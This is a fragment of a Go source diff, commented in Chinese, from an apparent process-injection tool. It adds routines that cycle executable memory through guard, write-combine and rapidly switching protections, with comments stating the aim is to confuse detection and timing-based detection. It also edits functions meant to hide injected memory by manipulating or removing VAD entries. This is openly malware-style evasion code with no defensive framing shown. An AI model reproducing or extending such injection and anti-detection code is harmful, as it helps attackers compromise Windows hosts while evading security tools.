-		uintptr(unsafe.Pointer(&size)),
-		uintptr(PAGE_EXECUTE_READ),
-		uintptr(unsafe.Pointer(&oldProtect)),
-	)
+		uintptr(unsafe.Pointer(&addr)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		PAGE_EXECUTE_READ|PAGE_GUARD,
+		uintptr(unsafe.Pointer(&oldProtect)))
 
-	if r1 != 0 {
-		return fmt.Errorf("设置内存为可执行失败: 0x%X", r1)
+	if r1 == 0 {
+		i.logger.Info("Set memory protection to EXECUTE_READ with GUARD")
+
+		// 等待一小段时间
+		time.Sleep(100 * time.Millisecond)
+
+		// 移除GUARD标志，保留执行权限
+		addr = memoryAddress
+		regionSize = size
+		r2, _, _ := ntProtectVirtualMemory.Call(
+			uintptr(processHandle),
+			uintptr(unsafe.Pointer(&addr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			PAGE_EXECUTE_READ,
+			uintptr(unsafe.Pointer(&oldProtect)))
+
+		if r2 == 0 {
+			i.logger.Info("Removed GUARD flag, memory remains executable")
+		}
 	}
 
-	// 然后设置为只读，但不刷新指令缓存
-	// 这会让内存在元数据上显示为只读，但实际上由于缓存原因仍然可执行
-	// 这只是一种模拟，真实PTE修改效果更强大
-	r1, _, _ = ntProtectVirtualMemory.Call(
+	// 策略2: 使用WRITECOMBINE标志来混淆检测
+	addr = memoryAddress
+	regionSize = size
+	r3, _, _ := ntProtectVirtualMemory.Call(
 		uintptr(processHandle),
-		uintptr(unsafe.Pointer(&memoryAddress)),
-		uintptr(unsafe.Pointer(&size)),
-		uintptr(PAGE_READONLY),
-		uintptr(unsafe.Pointer(&oldProtect)),
-	)
+		uintptr(unsafe.Pointer(&addr)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		PAGE_EXECUTE_READ|PAGE_WRITECOMBINE,
+		uintptr(unsafe.Pointer(&oldProtect)))
 
-	if r1 != 0 {
-		return fmt.Errorf("设置内存为只读失败: 0x%X", r1)
+	if r3 == 0 {
+		i.logger.Info("Applied WRITECOMBINE flag to executable memory")
+
+		// 短暂等待后移除特殊标志
+		time.Sleep(50 * time.Millisecond)
+		addr = memoryAddress
+		regionSize = size
+		ntProtectVirtualMemory.Call(
+			uintptr(processHandle),
+			uintptr(unsafe.Pointer(&addr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			PAGE_EXECUTE_READ,
+			uintptr(unsafe.Pointer(&oldProtect)))
 	}
 
-	fmt.Printf("已完成PTE修改模拟\n")
+	// 策略3: 快速切换内存保护属性来混淆时序检测
+	protections := []uint32{
+		PAGE_READONLY,
+		PAGE_READWRITE,
+		PAGE_EXECUTE_READ,
+		PAGE_EXECUTE_READWRITE,
+		PAGE_EXECUTE_READ, // 最终状态
+	}
+
+	for _, prot := range protections {
+		addr = memoryAddress
+		regionSize = size
+		ntProtectVirtualMemory.Call(
+			uintptr(processHandle),
+			uintptr(unsafe.Pointer(&addr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(prot),
+			uintptr(unsafe.Pointer(&oldProtect)))
+		time.Sleep(10 * time.Millisecond) // 短暂延迟
+	}
+
+	i.logger.Info("PTE spoofing simulation completed")
 	return nil
 }
 
 // vadManipulation 使用VAD操作隐藏内存
 func (i *Injector) vadManipulation(processHandle windows.Handle, memoryAddress uintptr) error {
-	fmt.Printf("执行VAD操作，隐藏内存区域...\n")
+	i.logger.Info("执行VAD操作，隐藏内存区域")
 
 	// 该功能需要内核级别访问权限才能直接修改VAD树
 	// 在用户模式下，我们只能模拟某些行为
@@ -2077,7 +2224,8 @@ func (i *Injector) vadManipulation(processHandle windows.Handle, memoryAddress u
 	)
 
 	if r1 != 0 {
-		return fmt.Errorf("查询内存信息失败: 0x%X", r1)
+		errMsg := "查询内存信息失败: 0x" + strconv.FormatUint(uint64(r1), 16)
+		return errors.New(errMsg)
 	}
 
 	// 内存属性常量
@@ -2104,16 +2252,17 @@ func (i *Injector) vadManipulation(processHandle windows.Handle, memoryAddress u
 	)
 
 	if r1 != 0 {
-		return fmt.Errorf("设置内存保护属性失败: 0x%X", r1)
+		errMsg := "设置内存保护属性失败: 0x" + strconv.FormatUint(uint64(r1), 16)
+		return errors.New(errMsg)
 	}
 
-	fmt.Printf("已完成VAD操作模拟\n")
+	i.logger.Info("已完成VAD操作模拟")
 	return nil
 }
 
 // removeVADNode 从VAD树中移除节点
 func (i *Injector) removeVADNode(processHandle windows.Handle, memoryAddress uintptr) error {
-	fmt.Printf("执行VAD节点移除操作...\n")
+	i.logger.Info("执行VAD节点移除操作")
 
 	// 该功能需要内核级别访问权限才能修改VAD树结构
 	// 从用户模式下，我们无法真正移除VAD节点，只能模拟某些效果
@@ -2152,7 +2301,8 @@ func (i *Injector) removeVADNode(processHandle windows.Handle, memoryAddress uin
 	)
 
 	if r1 != 0 {
-		return fmt.Errorf("查询内存信息失败: 0x%X", r1)
+		errMsg := "查询内存信息失败: 0x" + strconv.FormatUint(uint64(r1), 16)
+		return errors.New(errMsg)
 	}
 
 	// 内存操作常量
@@ -2220,37 +2370,6 @@ func (i *Injector) removeVADNode(processHandle windows.Handle, memoryAddress uin
 		return fmt.Errorf("恢复内存数据失败: %v", err)
 	}
 
-	fmt.Printf("已完成VAD节点移除模拟\n")
+	i.logger.Info("已完成VAD节点移除模拟")
 	return nil
-}
-
-// getSystemProgramPath 获取系统程序的路径
-func getSystemProgramPath(programName string) (string, error) {
-	// 获取系统目录
-	kernel32 := windows.NewLazyDLL("kernel32.dll")
-	getSystemDirectoryW := kernel32.NewProc("GetSystemDirectoryW")
-
-	var buffer [windows.MAX_PATH]uint16
-
-	// 调用GetSystemDirectoryW获取系统目录
-	ret, _, _ := getSystemDirectoryW.Call(
-		uintptr(unsafe.Pointer(&buffer[0])),
-		uintptr(len(buffer)),
-	)
-
-	if ret == 0 {
-		return "", fmt.Errorf("获取系统目录失败")
-	}
-
-	// 转换路径
-	sysDir := windows.UTF16ToString(buffer[:])
-	fullPath := sysDir + "\\" + programName
-
-	// 检查文件是否存在
-	_, err := os.Stat(fullPath)
-	if err != nil {
-		return "", fmt.Errorf("系统程序不存在: %v", err)
-	}
-
-	return fullPath, nil
 }
